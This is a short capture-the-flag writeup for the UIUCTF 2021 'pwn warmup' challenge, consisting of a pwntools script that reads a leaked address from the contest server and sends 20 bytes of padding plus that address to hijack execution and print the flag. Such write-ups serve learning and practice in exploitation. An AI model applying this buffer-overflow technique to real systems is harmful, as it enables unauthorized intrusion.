---
layout: load_md
title: The White Circle | Uiuctf 2021 | pwn warmup Writeup
desc: Check out our writeup for pwn warmup for Uiuctf 2021 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Uiuctf 2021
parent: uiuctf_2021
category: pwn
challenge: pwn warmup
tags: "pwn, twh"
date: 2021-08-12T00:00:00+00:00
last_modified_at: 2021-08-12T00:00:00+00:00
---


> Solved by : thewhiteh4t


    #!/usr/bin/python3
    
    from pwn import *
    
    host = 'pwn-warmup.chal.uiuc.tf'
    port = 1337
    offset = 20
    addr = 0
    
    junk = b'A' * offset
    
    conn = remote(host, port)
    lines = conn.recvuntil('ad\n').decode().split('\n')
    addr = lines[2].split(' = ')[1].strip()
    addr = int(addr, 16)
    le_num = p64(addr)
    buffer = junk + le_num
    conn.sendline(buffer)
    flag = conn.recvuntil('}').decode()
    print(flag)
    


![](https://i.imgur.com/Usy3A7i.png)


